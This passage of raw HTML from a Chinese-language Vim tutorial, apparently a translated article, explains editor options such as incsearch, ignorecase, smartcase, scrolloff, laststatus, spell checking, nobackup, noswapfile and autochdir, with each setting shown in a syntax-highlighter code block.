class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset incsearch</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21d6747138628-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21d6747138628-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">incsearch</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/327cf7882ec8d967ca6b5930f031d829.png\" alt=\"\"></p>\n<p>搜索时忽略大小写：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21da352531341\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset ignorecase</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21da352531341-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21da352531341-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">ignorecase</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在打开 <code>ignorecase</code> 选项的条件下，搜索内容包含部分大写字符时，要使搜索大小写敏感：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21dd741299315\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset smartcase</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21dd741299315-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21dd741299315-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">smartcase</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>例如，如果文件内容是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21e0015260716\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntest\r\nTest</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21e0015260716-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66fbd21e0015260716-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21e0015260716-1\"><span class=\"crayon-e\">test</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66fbd21e0015260716-2\"><span class=\"crayon-v\">Test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>当打开 <code>ignorecase</code> 和 <code>smartcase</code> 选项时，搜索 <code>test</code> 时的突出显示：</p>\n<blockquote><p>test<br>\nTest</p></blockquote>\n<p>搜索 <code>Test</code> 时的突出显示：</p>\n<blockquote><p>test<br>\nTest</p></blockquote>\n<h3 id=\"toc_5\">4. 浏览 &amp; 滚动</h3>\n<p>为获得更好的视觉体验，你可能希望将光标放在窗口中间而不是第一行，以下选项使光标距窗口上下保留 5 行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21e3901813329\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset scrolloff=5</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21e3901813329-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21e3901813329-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">scrolloff</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>一个例子：</p>\n<p>第一张图中 <code>scrolloff=0</code>，第二张图中 <code>scrolloff=5</code>。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/95f6d1a5dd90f97b56eb8030c7636612.jpg\" alt=\"\"></p>\n<p>提示：如果你没有设置选项 <code>nowrap</code>，那么设置 <code>sidescrolloff</code> 将非常有用。</p>\n<p>在 <code>Vim</code> 窗口底部显示一个永久状态栏，可以显示文件名、行号和列号等内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21e6830944207\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset laststatus=2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21e6830944207-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21e6830944207-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">laststatus</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/5ba560439be8027fd02d4f4d1633a1ca.png\" alt=\"\"></p>\n<h3 id=\"toc_6\">5. 拼写</h3>\n<p><code>Vim</code> 有一个内置的拼写检查器，对于文本编辑和编码非常有用。<code>Vim</code> 可以识别文件类型并仅对代码中的注释进行拼写检查。使用下面的选项打开英语拼写检查：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21e9173798346\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset spell spelllang=en_us</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21e9173798346-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21e9173798346-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">spell </span><span class=\"crayon-v\">spelllang</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">en_us</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>（LCTT 译注：中文、日文或其它东亚语字符通常会在打开拼写检查时被标为拼写错误，因为拼写检查不支持这些语种，可以在 <code>spelllang</code> 选项中加入 <code>cjk</code> 来忽略这些错误标注。）</p>\n<h3 id=\"toc_7\">6. 其他选项</h3>\n<p>禁止创建备份文件：启用此选项后，<code>Vim</code> 将在覆盖文件前创建一个备份，文件成功写入后保留该备份。如果不想保留该备份文件，可以按下面的方式关闭：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21ed028713038\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset nobackup</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21ed028713038-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21ed028713038-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">nobackup</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>禁止创建交换文件：启用此选项后，<code>Vim</code> 将在编辑该文件时创建一个交换文件。 交换文件用于在崩溃或发生使用冲突时恢复文件。交换文件是以 <code>.</code> 开头并以 <code>.swp</code> 结尾的隐藏文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21f0927622406\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset noswapfile</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21f0927622406-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21f0927622406-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">noswapfile</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果需要在同一个 <code>Vim</code> 窗口中编辑多个文件并进行切换。默认情况下，工作目录是打开的第一个文件的目录。而将工作目录自动切换到正在编辑的文件的目录是非常有用的。要自动切换工作目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21f3870638200\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset autochdir</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21f3870638200-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21f3870638200-1\"><span class=\"crayon-e\">set </span><span 